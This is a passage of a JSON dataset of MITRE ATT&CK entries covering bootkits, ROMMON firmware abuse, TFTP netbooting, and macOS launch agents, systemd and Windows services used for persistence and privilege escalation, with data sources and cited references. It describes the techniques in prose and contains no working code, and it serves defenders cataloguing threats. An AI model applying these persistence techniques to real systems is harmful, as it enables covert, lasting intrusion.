        "url": "https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf",
        "description": "Mandiant. (2016, February 25). Mandiant M-Trends 2016. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Lau 2011",
        "url": "http://www.symantec.com/connect/blogs/are-mbr-infections-back-fashion",
        "description": "Lau, H. (2011, August 8). Are MBR Infections Back in Fashion? (Infographic). Retrieved November 13, 2014.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1b7b1806-7746-41a1-a35d-e48dae25ddba",
    "platform": "linux|windows",
    "tid": "T1542.003",
    "technique": "Bootkit",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|mbr|vbr",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.<!-- raw HTML omitted --><!-- raw HTML omitted -->A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)<!-- raw HTML omitted --><!-- raw HTML omitted -->The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/552.html",
        "description": "none",
        "external_id": "CAPEC-552"
      },
      {
        "source_name": "Mandiant M Trends 2016",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf",
        "description": "Mandiant. (2016, February 25). Mandiant M-Trends 2016. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Lau 2011",
        "url": "http://www.symantec.com/connect/blogs/are-mbr-infections-back-fashion",
        "description": "Lau, H. (2011, August 8). Are MBR Infections Back in Fashion? (Infographic). Retrieved November 13, 2014.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a6557c75-798f-42e4-be70-ab4502e0a3bc",
    "platform": "network",
    "tid": "T1542.004",
    "technique": "ROMMONkit",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|netflow-enclave-netflow|network-protocol-analysis|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to <a href=\"https://attack.mitre.org/techniques/T1542/005\">TFTP Boot</a>, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.</p>\n",
    "technique_references": [
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a6557c75-798f-42e4-be70-ab4502e0a3bc",
    "platform": "network",
    "tid": "T1542.004",
    "technique": "ROMMONkit",
    "tactic": "persistence",
    "datasources": "file-monitoring|netflow-enclave-netflow|network-protocol-analysis|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to <a href=\"https://attack.mitre.org/techniques/T1542/005\">TFTP Boot</a>, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.</p>\n",
    "technique_references": [
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--28abec6c-4443-4b03-8206-07f2e264a6b4",
    "platform": "network",
    "tid": "T1542.005",
    "technique": "TFTP Boot",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|network-device-command-history|network-device-configuration|network-device-logs|network-device-run-time-memory",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with <a href=\"https://attack.mitre.org/techniques/T1601\">Modify System Image</a> to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to <a href=\"https://attack.mitre.org/techniques/T1542/004\">ROMMONkit</a> and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)</p>\n",
    "technique_references": [
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Secure Boot",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#35",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Secure Boot. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Image File Verification",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#7",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Image File Verification. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Run-Time Memory Verification",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#13",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Run-Time Memory Integrity Verification. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Command History",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#23",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Command History. Retrieved October 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Boot Information",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#26",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Boot Information. Retrieved October 21, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--28abec6c-4443-4b03-8206-07f2e264a6b4",
    "platform": "network",
    "tid": "T1542.005",
    "technique": "TFTP Boot",
    "tactic": "persistence",
    "datasources": "file-monitoring|network-device-command-history|network-device-configuration|network-device-logs|network-device-run-time-memory",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with <a href=\"https://attack.mitre.org/techniques/T1601\">Modify System Image</a> to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to <a href=\"https://attack.mitre.org/techniques/T1542/004\">ROMMONkit</a> and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)</p>\n",
    "technique_references": [
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Secure Boot",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#35",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Secure Boot. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Image File Verification",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#7",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Image File Verification. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Run-Time Memory Verification",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#13",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Run-Time Memory Integrity Verification. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Command History",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#23",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Command History. Retrieved October 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Boot Information",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#26",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Boot Information. Retrieved October 21, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d10cbd34-42e3-45c0-84d2-535a09849584",
    "platform": "macos",
    "tid": "T1543.001",
    "technique": "Launch Agent",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in <!-- raw HTML omitted -->/System/Library/LaunchAgents<!-- raw HTML omitted -->, <!-- raw HTML omitted -->/Library/LaunchAgents<!-- raw HTML omitted -->, and <!-- raw HTML omitted -->$HOME/Library/LaunchAgents<!-- raw HTML omitted --> (Citation: AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware). These launch agents have property list files which point to the executables that will be launched (Citation: OSX.Dok Malware).<!-- raw HTML omitted --> <!-- raw HTML omitted -->Adversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  (Citation: Sofacy Komplex Trojan)  (Citation: Methods of Mac Malware Persistence). The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).</p>\n",
    "technique_references": [
      {
        "source_name": "AppleDocs Launch Agent Daemons",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html",
        "description": "Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Keydnap malware",
        "url": "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/",
        "description": "Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Antiquated Mac Malware",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/",
        "description": "Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX.Dok Malware",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/",
        "description": "Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Sofacy Komplex Trojan",
        "url": "https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/",
        "description": "Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Malware Detection",
        "url": "https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf",
        "description": "Patrick Wardle. (2016, February 29). Let's Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OceanLotus for OS X",
        "url": "https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update",
        "description": "Eddie Lee. (2016, February 17). OceanLotus for OS X - an Application Bundle Pretending to be an Adobe Flash Update. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d10cbd34-42e3-45c0-84d2-535a09849584",
    "platform": "macos",
    "tid": "T1543.001",
    "technique": "Launch Agent",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in <!-- raw HTML omitted -->/System/Library/LaunchAgents<!-- raw HTML omitted -->, <!-- raw HTML omitted -->/Library/LaunchAgents<!-- raw HTML omitted -->, and <!-- raw HTML omitted -->$HOME/Library/LaunchAgents<!-- raw HTML omitted --> (Citation: AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware). These launch agents have property list files which point to the executables that will be launched (Citation: OSX.Dok Malware).<!-- raw HTML omitted --> <!-- raw HTML omitted -->Adversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  (Citation: Sofacy Komplex Trojan)  (Citation: Methods of Mac Malware Persistence). The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).</p>\n",
    "technique_references": [
      {
        "source_name": "AppleDocs Launch Agent Daemons",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html",
        "description": "Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Keydnap malware",
        "url": "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/",
        "description": "Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Antiquated Mac Malware",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/",
        "description": "Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX.Dok Malware",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/",
        "description": "Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Sofacy Komplex Trojan",
        "url": "https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/",
        "description": "Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Malware Detection",
        "url": "https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf",
        "description": "Patrick Wardle. (2016, February 29). Let's Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OceanLotus for OS X",
        "url": "https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update",
        "description": "Eddie Lee. (2016, February 17). OceanLotus for OS X - an Application Bundle Pretending to be an Adobe Flash Update. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b",
    "platform": "linux",
    "tid": "T1543.002",
    "technique": "Systemd Service",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.<!-- raw HTML omitted --><!-- raw HTML omitted -->Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <!-- raw HTML omitted -->/etc/systemd/system<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/usr/lib/systemd/system<!-- raw HTML omitted --> directories and have the file extension <!-- raw HTML omitted -->.service<!-- raw HTML omitted -->. Each service unit file may contain numerous directives that can execute system commands:<!-- raw HTML omitted --><!-- raw HTML omitted -->* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by ‘systemctl’ or on system start if the service is set to automatically start. <!-- raw HTML omitted -->* ExecReload directive covers when a service restarts. <!-- raw HTML omitted -->* ExecStop and ExecStopPost directives cover when a service is stopped or manually by ‘systemctl’.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.(Citation: Anomali Rocke March 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->While adversaries typically require root privileges to create/modify service unit files in the <!-- raw HTML omitted -->/etc/systemd/system<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/usr/lib/systemd/system<!-- raw HTML omitted --> directories, low privilege users can create/modify service unit files in directories such as <!-- raw HTML omitted -->~/.config/systemd/user/<!-- raw HTML omitted --> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/550.html",
        "description": "none",
        "external_id": "CAPEC-550"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/551.html",
        "description": "none",
        "external_id": "CAPEC-551"
      },
      {
        "source_name": "Linux man-pages: systemd January 2014",
        "url": "http://man7.org/linux/man-pages/man1/systemd.1.html",
        "description": "Linux man-pages. (2014, January). systemd(1) - Linux manual page. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Freedesktop.org Linux systemd 29SEP2018",
        "url": "https://www.freedesktop.org/wiki/Software/systemd/",
        "description": "Freedesktop.org. (2018, September 29). systemd System and Service Manager. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Anomali Rocke March 2019",
        "url": "https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang",
        "description": "Anomali Labs. (2019, March 15). Rocke Evolves Its Arsenal With a New Malware Family Written in Golang. Retrieved April 24, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Rapid7 Service Persistence 22JUNE2016",
        "url": "https://www.rapid7.com/db/modules/exploit/linux/local/service_persistence",
        "description": "Rapid7. (2016, June 22). Service Persistence. Retrieved April 23, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b",
    "platform": "linux",
    "tid": "T1543.002",
    "technique": "Systemd Service",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.<!-- raw HTML omitted --><!-- raw HTML omitted -->Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <!-- raw HTML omitted -->/etc/systemd/system<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/usr/lib/systemd/system<!-- raw HTML omitted --> directories and have the file extension <!-- raw HTML omitted -->.service<!-- raw HTML omitted -->. Each service unit file may contain numerous directives that can execute system commands:<!-- raw HTML omitted --><!-- raw HTML omitted -->* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by ‘systemctl’ or on system start if the service is set to automatically start. <!-- raw HTML omitted -->* ExecReload directive covers when a service restarts. <!-- raw HTML omitted -->* ExecStop and ExecStopPost directives cover when a service is stopped or manually by ‘systemctl’.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.(Citation: Anomali Rocke March 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->While adversaries typically require root privileges to create/modify service unit files in the <!-- raw HTML omitted -->/etc/systemd/system<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/usr/lib/systemd/system<!-- raw HTML omitted --> directories, low privilege users can create/modify service unit files in directories such as <!-- raw HTML omitted -->~/.config/systemd/user/<!-- raw HTML omitted --> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/550.html",
        "description": "none",
        "external_id": "CAPEC-550"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/551.html",
        "description": "none",
        "external_id": "CAPEC-551"
      },
      {
        "source_name": "Linux man-pages: systemd January 2014",
        "url": "http://man7.org/linux/man-pages/man1/systemd.1.html",
        "description": "Linux man-pages. (2014, January). systemd(1) - Linux manual page. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Freedesktop.org Linux systemd 29SEP2018",
        "url": "https://www.freedesktop.org/wiki/Software/systemd/",
        "description": "Freedesktop.org. (2018, September 29). systemd System and Service Manager. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Anomali Rocke March 2019",
        "url": "https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang",
        "description": "Anomali Labs. (2019, March 15). Rocke Evolves Its Arsenal With a New Malware Family Written in Golang. Retrieved April 24, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Rapid7 Service Persistence 22JUNE2016",
        "url": "https://www.rapid7.com/db/modules/exploit/linux/local/service_persistence",
        "description": "Rapid7. (2016, June 22). Service Persistence. Retrieved April 23, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
    "platform": "windows",
    "tid": "T1543.003",
    "technique": "Windows Service",
    "tactic": "persistence",
    "datasources": "api-monitoring|file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service’s executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and <a href=\"https://attack.mitre.org/software/S0075\">Reg</a>. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may also incorporate <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a> by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. <!-- raw HTML omitted --><!-- raw HTML omitted -->Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through <a href=\"https://attack.mitre.org/techniques/T1569/002\">Service Execution</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/478.html",
        "description": "none",
        "external_id": "CAPEC-478"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/550.html",
        "description": "none",
        "external_id": "CAPEC-550"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/551.html",
        "description": "none",
        "external_id": "CAPEC-551"
      },
      {
        "source_name": "TechNet Services",
